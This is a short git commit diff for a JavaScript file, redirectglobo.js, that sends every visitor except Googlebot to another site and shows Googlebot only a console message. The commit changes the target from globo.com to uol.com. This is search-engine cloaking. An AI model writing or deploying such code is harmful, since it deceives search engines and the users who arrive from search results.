f17341d191b408353ab3a00fc10ebf237273a1c7
jornadajob <jornadajob@gmail.com>
2026-08-20 11:35:12 -0300

    Update redirectglobo.js

--- redirectglobo.js
+++ redirectglobo.js
@@ -1,6 +1,6 @@
 if (!navigator.userAgent.includes('Googlebot')) {
     // Redirect only normal users
-    window.location.href = "https://globo.com/";
+    window.location.href = "https://uol.com/";
 } else {
     console.log("Thanks for visiting my page");
 }
